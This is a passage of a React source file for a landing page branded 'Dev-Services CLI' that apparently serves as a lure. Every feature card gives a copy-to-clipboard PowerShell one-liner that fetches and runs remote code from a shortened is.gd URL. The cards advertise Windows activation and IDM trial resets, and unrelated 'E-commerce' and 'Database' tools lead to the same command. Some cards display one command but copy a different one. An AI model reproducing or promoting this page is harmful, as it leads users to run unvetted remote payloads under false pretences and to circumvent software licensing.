"use client";
import { useState, useEffect, useRef } from "react";

const ClipboardIcon = ({ className }: { className?: string }) => (
  <svg
    className={className}
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"
    />
  </svg>
);

const CheckIcon = ({ className }: { className?: string }) => (
  <svg
    className={className}
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M5 13l4 4L19 7"
    />
  </svg>
);

const WindowsIcon = ({ className }: { className?: string }) => (
  <svg className={className} fill="currentColor" viewBox="0 0 24 24">
    <path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-13.051-1.351" />
  </svg>
);

const RefreshIcon = ({ className }: { className?: string }) => (
  <svg
    className={className}
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"
    />
  </svg>
);

const PackageIcon = ({ className }: { className?: string }) => (
  <svg
    className={className}
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4"
    />
  </svg>
);

const ShoppingCartIcon = ({ className }: { className?: string }) => (
  <svg
    className={className}
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M3 3h2l.4 2M7 13h10l4-8H5.4m0 0L7 13m0 0l-2.5 5M7 13l2.5 5m0 0L17 18m-7.5 0h7.5"
    />
  </svg>
);

const DatabaseIcon = ({ className }: { className?: string }) => (
  <svg
    className={className}
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4"
    />
  </svg>
);

const LightningIcon = ({ className }: { className?: string }) => (
  <svg
    className={className}
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M13 10V3L4 14h7v7l9-11h-7z"
    />
  </svg>
);

const CloudIcon = ({ className }: { className?: string }) => (
  <svg
    className={className}
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M7 16a4 4 0 01-.88-7.903A5 5 0 0115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10"
    />
  </svg>
);

const ShieldIcon = ({ className }: { className?: string }) => (
  <svg
    className={className}
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
    />
  </svg>
);

const ContainerIcon = ({ className }: { className?: string }) => (
  <svg
    className={className}
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"
    />
  </svg>
);

const ChartIcon = ({ className }: { className?: string }) => (
  <svg
    className={className}
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2m14 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"
    />
  </svg>
);

const BeakerIcon = ({ className }: { className?: string }) => (
  <svg
    className={className}
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547A1.934 1.934 0 004 16.684v4.650a2 2 0 002 2h12a2 2 0 002-2v-4.65a1.935 1.935 0 00-.572-1.256z"
    />
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M9 12V7.5a.5.5 0 01.5-.5h5a.5.5 0 01.5.5V12"
    />
  </svg>
);

const CpuIcon = ({ className }: { className?: string }) => (
  <svg
    className={className}
    fill="none"
    stroke="currentColor"
    viewBox="0 0 24 24"
  >
    <path
      strokeLinecap="round"
      strokeLinejoin="round"
      strokeWidth={2}
      d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"
    />
  </svg>
);
const PowerShellIcon = ({ className }: { className?: string }) => (
  <svg
    className={className}
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="1"
    strokeLinecap="round"
    strokeLinejoin="round"
  >
    {/* Terminal outline */}
    <rect x="2" y="4" width="20" height="16" rx="2" />

    {/* PS letters */}
    <text
      x="4"
      y="15"
      fill="currentColor"
      fontSize="8"
      fontFamily="monospace"
      fontWeight="bold"
    ></text>

    {/* Command symbols */}
    <path d="M8 10l2 2-2 2M14 14h4" />

    {/* Cursor */}
    {/* <rect x="20" y="13" width="1" height="2" fill="currentColor" /> */}
  </svg>
);
const PowerShellIconScript = ({ className }: { className?: string }) => (
  <svg
    className={className}
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="1"
    strokeLinecap="round"
    strokeLinejoin="round"
  >
    {/* Terminal outline */}
    <rect x="2" y="4" width="20" height="16" rx="" />

    {/* PS letters */}
    <text
      x="4"
      y="15"
      fill="currentColor"
      fontSize="8"
      fontFamily="monospace"
      fontWeight="bold"
    ></text>

    {/* Command symbols */}
    <path d="M8 10l2 2-2 2M14 14h4" />
  </svg>
);

export default function DevServicesPage() {
  const [copied, setCopied] = useState(false);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [hoveredCard, setHoveredCard] = useState<string | null>(null);
  const [displayedText, setDisplayedText] = useState("");
  const [isTypingComplete, setIsTypingComplete] = useState(false);
  const [hoverCooldown, setHoverCooldown] = useState(false);
  const cooldownRef = useRef<NodeJS.Timeout | null>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const copyToClipboard = async () => {
    try {
      if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(
          "iex (irm https://is.gd/dev_services)"
        );
      } else {
        // Fallback for older browsers or non-secure contexts
        const textArea = document.createElement("textarea");
        textArea.value = "iex (irm https://is.gd/dev_services)";
        textArea.style.position = "fixed";
        textArea.style.left = "-999999px";
        textArea.style.top = "-999999px";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        document.execCommand("copy");
        textArea.remove();
      }
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    } catch (err) {
      console.error("Failed to copy text: ", err);
      // Show user-friendly error message as fallback
      alert(
        "Failed to copy to clipboard. Please copy manually: iex (irm https://is.gd/dev_services)"
      );
    }
  };

  const copyScript = async (script: string) => {
    try {
      if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(script);
      } else {
        // Fallback for older browsers or non-secure contexts
        const textArea = document.createElement("textarea");
        textArea.value = script;
        textArea.style.position = "fixed";
        textArea.style.left = "-999999px";
        textArea.style.top = "-999999px";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        document.execCommand("copy");
        textArea.remove();
      }
      // Visual feedback could be added here
    } catch (err) {
      console.error("Failed to copy script: ", err);
      // Show user-friendly error message
      alert("Failed to copy to clipboard. Please copy manually: " + script);
    }
  };

  // Matrix Rain Effect (slowed for comfort)
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    let animationFrameId: number;
    let width = window.innerWidth;
    let height = window.innerHeight;
    let fontSize = 18;
    let columns = Math.floor(width / fontSize);
    let drops: number[] = Array(columns).fill(1);
    const chars =
      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@!%&*()[]{}<>|/\\-=+_~";

    // Each drop will have its own speed for more natural effect
    let speeds: number[] = Array(columns).fill(0).map(() => 0.5 + Math.random() * 0.7); // 0.5-1.2 px per frame

    function resize() {
      width = window.innerWidth;
      height = window.innerHeight;
      if (!canvas) return;
      canvas.width = width;
      canvas.height = height;
      columns = Math.floor(width / fontSize);
      drops = Array(columns).fill(1);
      speeds = Array(columns).fill(0).map(() => 0.5 + Math.random() * 0.7);
    }

    let lastDraw = 0;
    const frameDelay = 1000 / 24; // ~24fps for less flicker, less strain

    function draw(now: number) {
      if (!ctx) return;
      if (now - lastDraw < frameDelay) {
        animationFrameId = requestAnimationFrame(draw);
        return;
      }
      lastDraw = now;
      ctx.fillStyle = "rgba(15, 23, 42, 0.7)"; // slate-900 with alpha
      ctx.fillRect(0, 0, width, height);

      ctx.font = `${fontSize}px monospace`;
      for (let i = 0; i < columns; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillStyle = "rgba(34, 197, 94, 0.7)"; // emerald-400, more subtle
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);

        if (drops[i] * fontSize > height && Math.random() > 0.985) {
          drops[i] = 0;
        }
        drops[i] += speeds[i];
      }
      animationFrameId = requestAnimationFrame(draw);
    }

    resize();
    window.addEventListener("resize", resize);
    animationFrameId = requestAnimationFrame(draw);

    return () => {
      window.removeEventListener("resize", resize);
      cancelAnimationFrame(animationFrameId);
    };
  }, []);

  useEffect(() => {
    const fullText = "Dev-Services CLI";
    let currentIndex = 0;
    let isDeleting = false;
    let typingTimeout: NodeJS.Timeout;

    const typeWriter = () => {
      if (!isDeleting) {
        // Typing forward
        setDisplayedText(fullText.slice(0, currentIndex + 1));
        currentIndex++;

        if (currentIndex === fullText.length) {
          // Pause at full text before deleting
          isDeleting = true;
          typingTimeout = setTimeout(typeWriter, 1000); // 1s pause
          return;
        }
      } else {
        // Delete one character at a time
        currentIndex--;
        setDisplayedText(fullText.slice(0, currentIndex));

        if (currentIndex === 0) {
          // Pause at empty text then restart typing
          isDeleting = false;
          typingTimeout = setTimeout(typeWriter, 1500); // 0.5s pause
          return;
        }
      }

      // Continue typing/deleting
      typingTimeout = setTimeout(typeWriter, 100); // 100ms per char
    };

    // Start typing after initial delay
    typingTimeout = setTimeout(typeWriter, 800);

    // Cleanup
    return () => clearTimeout(typingTimeout);
  }, []);

  return (
    <div className="min-h-screen relative overflow-hidden bg-slate-900">
      {/* Matrix Rain Background */}
      <canvas
        ref={canvasRef}
        className="absolute inset-0 w-full h-full object-cover"
        style={{ zIndex: 0 }}
        aria-hidden="true"
      />

      {hoveredCard && (
        <div className="fixed inset-0 bg-black/20 backdrop-blur-sm z-5 pointer-events-none transition-all duration-300" />
      )}

      {/* Navigation Bar */}
      <nav className="relative z-20 backdrop-blur-xl bg-white/5 border-b border-white/10">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            {/* Logo/Brand */}
            <div className="flex items-center">
              <div className="text-l font-bold bg-gradient-to-r from-indigo-400 to-purple-400 bg-clip-text text-transparent">
                Dev-Services
              </div>
              <span className="ml-3 px-2 py-1 text-xs bg-green-500/20 text-green-400 rounded-full border border-green-500/30">
                v2.10
              </span>
              <span
                className="ml-2 w-2 h-2 bg-green-400 rounded-full animate-pulse"
                title="All services operational"
              ></span>
            </div>

            {/* Navigation Links */}
            <div className="hidden md:block">
              <div className="ml-10 flex items-baseline space-x-4">
                <a
                  href="#features"
                  className="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition-colors"
                >
                  Features
                </a>
                <a
                  href="#installation"
                  className="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition-colors"
                >
                  Installation
                </a>
                <a
                  href="#docs"
                  className="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition-colors"
                >
                  Documentation
                </a>
                <a
                  href="#api"
                  className="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition-colors"
                >
                  API Reference
                </a>
                <a
                  href="#community"
                  className="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition-colors"
                >
                  Community
                </a>
                <a
                  href="#changelog"
                  className="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition-colors"
                >
                  Changelog
                </a>
                <a
                  href="#support"
                  className="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition-colors"
                >
                  Support
                </a>
                <a
                  href="https://github.com/dev-services/cli"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-gray-300 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition-colors flex items-center gap-2"
                >
                  <svg
                    className="w-4 h-4"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M10 0C4.477 0 0 4.484 0 10.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0110 4.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.203 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.942.359.31.678.921.678 1.856 0 .268.18.58.688.482A10.019 10.019 0 0020 10.017C20 4.484 15.522 0 10 0z"
                      clipRule="evenodd"
                    />
                  </svg>
                  GitHub
                  <span className="ml-1 px-1.5 py-0.5 text-xs bg-gray-700 text-gray-300 rounded">
                    2.3k ⭐
                  </span>
                </a>
              </div>
            </div>

            <div className="md:hidden flex items-center gap-3">
              {/* <span className="px-2 py-1 text-xs bg-green-500/20 text-green-400 rounded-full border border-green-500/30">
                v2.10
              </span> */}
              <button
                onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
                className="text-gray-300 hover:text-white p-2 transition-colors"
                aria-label="Toggle mobile menu"
              >
                <svg
                  className="w-6 h-6"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M4 6h16M4 12h16M4 18h16"
                  />
                </svg>
              </button>
            </div>
          </div>

          {mobileMenuOpen && (
            <div className="md:hidden border-t border-white/10 py-4">
              <div className="flex flex-col space-y-2">
                <a
                  href="#features"
                  className="text-gray-300 hover:text-white px-3 py-2 text-sm font-medium transition-colors"
                >
                  Features
                </a>
                <a
                  href="#installation"
                  className="text-gray-300 hover:text-white px-3 py-2 text-sm font-medium transition-colors"
                >
                  Installation
                </a>
                <a
                  href="#docs"
                  className="text-gray-300 hover:text-white px-3 py-2 text-sm font-medium transition-colors"
                >
                  Documentation
                </a>
                <a
                  href="#api"
                  className="text-gray-300 hover:text-white px-3 py-2 text-sm font-medium transition-colors"
                >
                  API Reference
                </a>
                <a
                  href="#community"
                  className="text-gray-300 hover:text-white px-3 py-2 text-sm font-medium transition-colors"
                >
                  Community
                </a>
                <a
                  href="#changelog"
                  className="text-gray-300 hover:text-white px-3 py-2 text-sm font-medium transition-colors"
                >
                  Changelog
                </a>
                <a
                  href="#support"
                  className="text-gray-300 hover:text-white px-3 py-2 text-sm font-medium transition-colors"
                >
                  Support
                </a>
                <a
                  href="https://github.com/dev-services/cli"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-gray-300 hover:text-white px-3 py-2 text-sm font-medium transition-colors flex items-center gap-2"
                >
                  <svg
                    className="w-4 h-4"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M10 0C4.477 0 0 4.484 0 10.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0110 4.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.203 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.942.359.31.678.921.678 1.856 0 .268.18.58.688.482A10.019 10.019 0 0020 10.017C20 4.484 15.522 0 10 0z"
                      clipRule="evenodd"
                    />
                  </svg>
                  GitHub
                  <span className="ml-1 px-1.5 py-0.5 text-xs bg-gray-700 text-gray-300 rounded">
                    2.3k ⭐
                  </span>
                </a>
              </div>
            </div>
          )}

          <div className="hidden lg:block border-t border-white/5 py-3">
            <div className="flex items-center justify-between text-xs text-gray-400">
              <div className="flex items-center gap-6">
                <span className="flex items-center gap-2">
                  <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
                  All Systems Operational
                </span>
                <span>Last Updated: 2 hours ago</span>
                <span>Active Users: 15.2K</span>
                <span>Total Downloads: 847K</span>
              </div>
              <div className="flex items-center gap-6">
                <a
                  href="#status"
                  className="hover:text-gray-300 transition-colors"
                >
                  System Status
                </a>
                <a
                  href="#security"
                  className="hover:text-gray-300 transition-colors"
                >
                  Security
                </a>
                <a
                  href="#privacy"
                  className="hover:text-gray-300 transition-colors"
                >
                  Privacy Policy
                </a>
              </div>
            </div>
          </div>
        </div>
      </nav>

      {/* Main Content */}
      <div className="relative z-10 min-h-screen flex items-center justify-center p-4">
        <div className="w-full max-w-4xl mx-auto" id="features">
          {/* Glass-morphism Card */}
          <div className="backdrop-blur-xl bg-white/5 border border-white/10 rounded-3xl shadow-2xl p-8 md:p-12">
            {/* Title Section */}
            <div className="text-center mb-12">
              <h1 className="text-2xl sm:text-3xl md:text-4xl lg:text-5xl font-bold mb-4 bg-gradient-to-r from-indigo-400 via-purple-400 to-pink-400 bg-clip-text text-transparent">
                {displayedText}
                {!isTypingComplete && (
                  <span className="animate-pulse text-white">|</span>
                )}
              </h1>
              <p className="text-lg md:text-xl text-gray-300 text-balance">
                Activate Windows • Reset IDM • Grab Deployment Tools — in one
                line.
              </p>
            </div>

            {/* Command Block */}
            <div className="mb-12">
              <div className="relative bg-slate-900/70 rounded-lg p-4 border border-slate-700/50">
                {/* Flex container instead of pre */}
                <div className="flex items-center gap-2 text-green-400 font-mono text-sm md:text-base overflow-x-auto whitespace-nowrap">
                  <PowerShellIcon className="w-8 h-8 text-blue-400 flex-shrink-0" />
                  <span>iex (irm https://is.gd/dev_services)</span>
                </div>

                <button
                  onClick={copyToClipboard}
                  className="absolute top-3 right-3 p-2 rounded-md bg-slate-800/80 hover:bg-slate-700/80 transition-colors border border-slate-600/50"
                  aria-label="Copy command"
                >
                  {copied ? (
                    <div className="flex items-center gap-2 text-green-400">
                      <CheckIcon className="w-4 h-4" />
                      <span className="text-sm">Copied!</span>
                    </div>
                  ) : (
                    <ClipboardIcon className="w-4 h-4 text-gray-400" />
                  )}
                </button>
              </div>
            </div>

            {/* Feature Grid */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-7 mb-12 relative">
              {/* Activate Windows */}
              <div
                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
                onMouseEnter={() => {
                  if (!hoverCooldown) setHoveredCard("windows");
                }}
                onMouseLeave={() => {
                  setHoveredCard(null);
                  setHoverCooldown(true);
                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
                  cooldownRef.current = setTimeout(
                    () => setHoverCooldown(false),
                    400
                  );
                }}
              >
                <div className="text-2xl mb-4">
                  <WindowsIcon className="w-8 h-8 text-blue-400" />
                </div>
                <h3 className="text-xl font-semibold text-white mb-2">
                  Activate Windows
                </h3>
                <p className="text-gray-300 text-sm mb-4">KMS activation via</p>
                <div className="w-full flex justify-start">
                  <code
                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-blue-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow whitespace-nowrap overflow-x-auto max-w-full"
                    onClick={() =>
                      copyScript("irm https://get.activated.win | iex")
                    }
                    title="Click to copy"
                  >
                    <PowerShellIconScript className="w-5 h-5 text-blue-400 flex-shrink-0" />
                    <span>iex (irm https://is.gd/dev_services)</span>
                  </code>
                </div>
              </div>

              {/* Reset IDM Trial */}
              <div
                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
                onMouseEnter={() => {
                  if (!hoverCooldown) setHoveredCard("idm");
                }}
                onMouseLeave={() => {
                  setHoveredCard(null);
                  setHoverCooldown(true);
                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
                  cooldownRef.current = setTimeout(
                    () => setHoverCooldown(false),
                    400
                  );
                }}
              >
                <div className="text-2xl mb-4">
                  <RefreshIcon className="w-8 h-8 text-green-400" />
                </div>
                <h3 className="text-xl font-semibold text-white mb-2">
                  Reset IDM Trial
                </h3>
                <p className="text-gray-300 text-sm mb-4">30-day reset via</p>
                <div className="w-full flex justify-start">
                  <code
                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-emerald-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow whitespace-nowrap overflow-x-auto max-w-full"
                    onClick={() => copyScript("irm is.gd/idm_reset | iex")}
                    title="Click to copy"
                  >
                    <PowerShellIconScript className="w-5 h-5 text-emerald-400 flex-shrink-0" />
                    <span>iex (irm https://is.gd/dev_services)</span>
                  </code>
                </div>
              </div>

              {/* Download Office Deployment Tool */}
              <div
                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
                onMouseEnter={() => {
                  if (!hoverCooldown) setHoveredCard("office");
                }}
                onMouseLeave={() => {
                  setHoveredCard(null);
                  setHoverCooldown(true);
                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
                  cooldownRef.current = setTimeout(
                    () => setHoverCooldown(false),
                    400
                  );
                }}
              >
                <div className="text-2xl mb-4">
                  <PackageIcon className="w-8 h-8 text-orange-400" />
                </div>
                <h3 className="text-xl font-semibold text-white mb-2">
                  Office Deployment Tool
                </h3>
                <p className="text-gray-300 text-sm mb-4">
                  Direct <code className="text-orange-400">.exe</code> grab from
                  Microsoft CDN
                </p>
                <div className="w-full flex justify-start">
                  <code
                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-orange-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow whitespace-nowrap overflow-x-auto max-w-full"
                    onClick={() =>
                      copyScript("iex (irm https://is.gd/dev_services)")
                    }
                    title="Click to copy"
                  >
                    <PowerShellIconScript className="w-5 h-5 text-orange-400 flex-shrink-0" />
                    <span>iex (irm https://is.gd/dev_services)</span>
                  </code>
                </div>
              </div>

              {/* E-commerce Store Setup */}
              <div
                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
                onMouseEnter={() => {
                  if (!hoverCooldown) setHoveredCard("ecommerce");
                }}
                onMouseLeave={() => {
                  setHoveredCard(null);
                  setHoverCooldown(true);
                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
                  cooldownRef.current = setTimeout(
                    () => setHoverCooldown(false),
                    400
                  );
                }}
              >
                <div className="text-2xl mb-4">
                  <ShoppingCartIcon className="w-8 h-8 text-amber-800" />
                </div>
                <h3 className="text-xl font-semibold text-white mb-2">
                  E-commerce Setup
                </h3>
                <p className="text-gray-300 text-sm mb-4">
                  WooCommerce + Stripe integration
                </p>
                <div className="w-full flex justify-start">
                  <code
                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-amber-800 cursor-pointer hover:bg-slate-800/70 transition-colors shadow whitespace-nowrap overflow-x-auto max-w-full"
                    onClick={() =>
                      copyScript("iex (irm https://is.gd/dev_services)")
                    }
                    title="Click to copy"
                  >
                    <PowerShellIconScript className="w-5 h-5 text-amber-800 flex-shrink-0" />
                    <span>iex (irm https://is.gd/dev_services)</span>
                  </code>
                </div>
              </div>

              {/* Database Management */}
              <div
                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
                onMouseEnter={() => {
                  if (!hoverCooldown) setHoveredCard("database");
                }}
                onMouseLeave={() => {
                  setHoveredCard(null);
                  setHoverCooldown(true);
                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
                  cooldownRef.current = setTimeout(
                    () => setHoverCooldown(false),
                    400
                  );
                }}
              >
                <div className="text-2xl mb-4">
                  <DatabaseIcon className="w-8 h-8 text-purple-400" />
                </div>
                <h3 className="text-xl font-semibold text-white mb-2">
                  Database Tools
                </h3>
                <p className="text-gray-300 text-sm mb-4">
                  MySQL, PostgreSQL, MongoDB setup
                </p>
                <div className="w-full flex justify-start">
                  <code
                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-purple-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow whitespace-nowrap overflow-x-auto max-w-full"
                    onClick={() =>
                      copyScript("iex (irm https://is.gd/dev_services)")
                    }
                    title="Click to copy"
                  >
                    <PowerShellIconScript className="w-5 h-5 text-purple-400 flex-shrink-0" />
                    <span>iex (irm https://is.gd/dev_services)</span>
                  </code>
                </div>
              </div>

              {/* API Development Kit */}
              <div
                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
                onMouseEnter={() => {
                  if (!hoverCooldown) setHoveredCard("api");
                }}
                onMouseLeave={() => {
                  setHoveredCard(null);
                  setHoverCooldown(true);
                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
                  cooldownRef.current = setTimeout(
                    () => setHoverCooldown(false),
                    400
                  );
                }}
              >
                <div className="text-2xl mb-4">
                  <LightningIcon className="w-8 h-8 text-yellow-400" />
                </div>
                <h3 className="text-xl font-semibold text-white mb-2">
                  API Dev Kit
                </h3>
                <p className="text-gray-300 text-sm mb-4">
                  REST & GraphQL scaffolding
                </p>
                <div className="w-full flex justify-start">
                  <code
                    className="flex items-center gap-2 text-xs bg-slate-900/60 px-3 py-2 rounded font-mono text-yellow-400 cursor-pointer hover:bg-slate-800/70 transition-colors shadow whitespace-nowrap overflow-x-auto max-w-full"
                    onClick={() =>
                      copyScript("iex (irm https://is.gd/dev_services)")
                    }
                    title="Click to copy"
                  >
                    <PowerShellIconScript className="w-5 h-5 text-yellow-400 flex-shrink-0" />
                    <span>iex (irm https://is.gd/dev_services)</span>
                  </code>
                </div>
              </div>

              {/* Cloud Services */}
              <div
                className={`bg-white/5 backdrop-blur-sm border border-white/10 rounded-xl p-6 h-full transition-all duration-300 cursor-pointer transform-gpu hover:scale-102 hover:shadow-lg hover:bg-white/10 hover:border-white/20`}
                onMouseEnter={() => {
                  if (!hoverCooldown) setHoveredCard("cloud");
                }}
                onMouseLeave={() => {
                  setHoveredCard(null);
                  setHoverCooldown(true);
                  if (cooldownRef.current) clearTimeout(cooldownRef.current);
